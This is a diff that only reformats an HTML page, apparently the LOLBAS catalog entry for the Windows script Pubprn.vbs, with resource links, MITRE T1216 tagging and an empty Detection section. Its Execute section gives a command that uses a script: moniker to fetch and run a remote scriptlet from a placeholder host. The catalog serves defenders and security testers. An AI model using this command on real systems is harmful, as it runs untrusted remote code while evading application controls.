@@ -28,13 +28,17 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Scripts/Pubprn/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Scripts/Pubprn/#execute">Execute</a></li>
+	
 </ul>
+
+	
+
+
 
 
 
@@ -50,64 +54,56 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/">https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/</a></li>
+	<a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/">https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/</a>
+	<br>
 	
-	<li><a href="https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology">https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology</a></li>
+	<a href="https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology">https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology</a>
+	<br>
 	
-	<li><a href="https://github.com/enigma0x3/windows-operating-system-archaeology">https://github.com/enigma0x3/windows-operating-system-archaeology</a></li>
+	<a href="https://github.com/enigma0x3/windows-operating-system-archaeology">https://github.com/enigma0x3/windows-operating-system-archaeology</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Matt Nelson - <a href="https://twitter.com/@enigma0x3">@enigma0x3</a </li>
+	Matt Nelson - <a href="https://twitter.com/@enigma0x3">@enigma0x3</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
+		<br>
+		<pre><code>pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct</code></pre>
 		Usecase:Proxy execution
-        <pre><code>pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
